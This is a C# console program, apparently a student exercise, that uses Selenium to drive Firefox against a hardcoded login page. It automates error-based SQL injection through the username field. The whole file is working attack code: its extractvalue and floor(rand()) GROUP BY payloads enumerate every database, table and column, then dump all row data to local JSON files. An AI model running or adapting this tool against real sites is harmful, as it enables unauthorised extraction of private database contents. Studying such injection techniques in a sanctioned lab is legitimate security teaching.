using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SQL_Injector_Console
{
    internal class Injector
    {
        IWebDriver driver;
        string url = "";
        public void Start()
        {
            url = "http://mofa-easj.dk/sites/sql/login.php";
            Console.Write("press any key to start");
            Console.ReadKey();
            Inject();
        }

        void Inject()
        {
            FirefoxOptions options = new FirefoxOptions();
            options.BrowserExecutableLocation = @"C:\Program Files\Mozilla Firefox\firefox.exe";
            driver = new FirefoxDriver(@"C:\BrowserDrivers\", options);

            driver.Url = url;
            string[] strings = GetStringArray("'");
            string error = FindError(strings);

            if (error.Contains("SQL")){
                List<string> databases = new List<string>();
                List<KeyValuePair<string,string>> tables = new List<KeyValuePair<string, string>>();
                List<KeyValuePair<string, KeyValuePair<string,string>>> columns = new List<KeyValuePair<string, KeyValuePair<string, string>>>();
                List<KeyValuePair<string, KeyValuePair<string, List<KeyValuePair<string, string>>>>> data = new List<KeyValuePair<string, KeyValuePair<string, List<KeyValuePair<string, string>>>>>();
                int databaseIndex = 0;

                Console.WriteLine("\n***");
                Console.WriteLine("Checking databases");
                Console.WriteLine("***\n");
                while (error != "**NOTHING FOUND**")
                {
                    strings = GetStringArray($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT {databaseIndex},1))); #");
                    error = FindError(strings);
                    if(error != "**NOTHING FOUND**")
                    {
                        error = error.Replace(" ", "");
                        Console.WriteLine(SplitStringAnswer(error));
                        databases.Add(SplitStringAnswer(error));
                        databaseIndex++;
                    }                    
                }
                Console.WriteLine("\n***");
                Console.WriteLine("Checking tables");
                Console.WriteLine("***\n");
                foreach (string database in databases)
                {
                    
                    int tableIndex = 0;
                    error = "";

                    Console.WriteLine("\n---");
                    Console.WriteLine($"Checking database '{database}' tables");
                    Console.WriteLine("---\n");

                    while (error != "**NOTHING FOUND**")
                    {
                        //Console.WriteLine($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='{database}' LIMIT {tableIndex},1))); #");
                        strings = GetStringArray($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='{database}' LIMIT {tableIndex},1))); #");
                        error = FindError(strings);
                        if (error != "**NOTHING FOUND**")
                        {
                            error = error.Replace(" ", "");
                            Console.WriteLine(SplitStringAnswer(error));
                            tables.Add(new KeyValuePair<string, string>(database, SplitStringAnswer(error)));
                            tableIndex++;
                        }
                    }
                }


                Console.WriteLine("\n***");
                Console.WriteLine("Checking columns");
                Console.WriteLine("***\n");
                foreach (KeyValuePair<string, string> table in tables)
                {
                    int columnIndex = 0;
                    error = "";

                    Console.WriteLine("\n---");
                    Console.WriteLine($"Checking table '{table.Value}' columns");
                    Console.WriteLine("---\n");

                    while (error != "**NOTHING FOUND**")
                    {
                        //Console.WriteLine($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table.Value}' AND table_schema = '{table.Key}' LIMIT {columnIndex},1))); #");
                        strings = GetStringArray($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table.Value}' AND table_schema = '{table.Key}' LIMIT {columnIndex},1))); #");
                        error = FindError(strings);
                        if (error != "**NOTHING FOUND**")
                        {
                            error = error.Replace(" ", "");
                            Console.WriteLine(SplitStringAnswer(error));
                            columns.Add(new KeyValuePair<string, KeyValuePair<string, string>>(table.Key, new KeyValuePair<string,string>(table.Value, SplitStringAnswer(error))));
                            columnIndex++;
                        }
                    }
                }

                Console.WriteLine("\n***");
                Console.WriteLine("Checking row column data");
                Console.WriteLine("***\n");
                foreach (KeyValuePair<string, string> table in tables)
                {
                    if(table.Key != "information_schema")
                    {
                        int dataIndex = 0;
                        error = "";

                        Console.WriteLine("\n---");
                        Console.WriteLine($"Checking database '{table.Key}' table '{table.Value}'");
                        Console.WriteLine("---\n");

                        while (error != "**NOTHING FOUND**")
                        {
                            string columnsString = "";
                            List<KeyValuePair<string, KeyValuePair<string, string>>> list = columns.FindAll(c => c.Key == table.Key && c.Value.Key == table.Value);
                            foreach (KeyValuePair<string, KeyValuePair<string, string>> column in list)
                            {
                                if (columnsString == "")
                                {
                                    columnsString += column.Value.Value;
                                }
                                else if (columnsString != "")
                                {
                                    columnsString += ",0x3a," + column.Value.Value;
                                }
                            }
                            /*foreach(KeyValuePair<string, KeyValuePair<string,string>> column in columns)
                            {
                                if(column.Key == table.Key && column.Value.Key == table.Value && columnsString == "")
                                {
                                    columnsString += "0x3a," + column.Value.Value;
                                }else if(column.Key == table.Key && column.Value.Key == table.Value && columnsString != "")
                                {
                                    columnsString += ",0x3a," + column.Value.Value;
                                }
                            }*/
                            //Console.WriteLine($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat({columnsString})   FROM   {table.Key}.{table.Value}   LIMIT {dataIndex},1))); #");
                            //strings = GetStringArray($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,{columnsString})   FROM   {table.Key}.{table.Value}   LIMIT {dataIndex},1))); #");
                            strings = GetStringArray($"' AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT concat(0x3a,{columnsString}) FROM {table.Key}.{table.Value} LIMIT {dataIndex},1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #");
                            error = FindError(strings);
                            if (error != "**NOTHING FOUND**")
                            {
                                error = error.Replace(" ", "");
                                Console.WriteLine(SplitStringAnswerData(error));
                                data.Add(new KeyValuePair<string, KeyValuePair<string, List<KeyValuePair<string, string>>>>(table.Key, new KeyValuePair<string, List<KeyValuePair<string, string>>>(table.Value, new List<KeyValuePair<string, string>>(CreateColumnDataList(SplitStringAnswerData(error), list)))));
                                dataIndex++;
                            }
                        }
                    }
                }

                string databaseJson = JsonConvert.SerializeObject(databases, Formatting.Indented);
                string tableJson = JsonConvert.SerializeObject(tables, Formatting.Indented);
                string columnJson = JsonConvert.SerializeObject(columns, Formatting.Indented);
                string dataJson = JsonConvert.SerializeObject(data, Formatting.Indented);

                File.WriteAllText("databases.json", databaseJson);
                File.WriteAllText("tables.json", tableJson);
                File.WriteAllText("columns.json", columnJson);
                File.WriteAllText("data.json", dataJson);

                Console.WriteLine("DONE!");
            }
            else if(error == "**NOTHING FOUND**")
            {
                Console.WriteLine("No SQL error insight");
                return;
            }
        }

        string FindError(string[] strings)
        {
            string error = "";
            if (strings[0] != "Login")
            {
                foreach (string s in strings)
                {
                    if (s != "Login")
                    {
                        error += s + " ";
                    }
                    else
                    {
                        break;
                    }
                }
            }
            else
            {
                error = "**NOTHING FOUND**";                
            }
            return error;
        }

        string[] GetStringArray(string injection)
        {
            driver.FindElement(By.Id("username")).SendKeys(injection);
            driver.FindElement(By.ClassName("register")).Click();
            var wait = new WebDriverWait(driver, TimeSpan.FromSeconds(2));
            IWebElement element = wait.Until(d => d.FindElement(By.CssSelector("body")));
            string[] strings = element.Text.Split(Environment.NewLine);

            return strings;
        }

        string SplitStringAnswer(string answer)
        {
            string output = answer.Substring(answer.IndexOf(':') + 4);
            output = output.Remove(output.Length - 1, 1);
            output = output.Replace(" ", "");
            return output;
        }

        string SplitStringAnswerData(string answer)
        {
            string output = answer.Substring(answer.IndexOf(':') + 2);
            output = output.Remove(output.Length - 23, 1);
            output = output.Replace(" ", "");
            return output;
        }

        List<KeyValuePair<string,string>> CreateColumnDataList(string data, List<KeyValuePair<string, KeyValuePair<string, string>>> list)
        {
            List<KeyValuePair<string,string>> columnDataList = new List<KeyValuePair<string,string>>();
            string[] columns = data.Split(":");
            int i = 0;
            foreach (string col in columns)
            {

                columnDataList.Add(new KeyValuePair<string, string>(list[i].Value.Value, col));
                i++;
            }

            return columnDataList;
        }
    }
}
